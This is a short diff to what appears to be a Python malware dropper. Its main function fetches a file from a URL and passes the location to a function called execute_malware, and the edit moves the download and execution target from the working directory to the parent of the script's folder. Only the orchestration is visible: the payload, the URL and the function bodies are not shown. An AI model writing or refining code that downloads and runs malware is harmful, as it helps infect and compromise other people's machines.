@@ -27,9 +27,11 @@ def execute_malware(path):
 
 # Main function
 def main():
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    root_dir = os.path.dirname(base_dir)
     file = get_url()
-    download(os.getcwd() , file)
-    execute_malware(os.getcwd())
+    download(root_dir , file)
+    execute_malware(root_dir)
 
 if __name__ == "__main__":
     main()
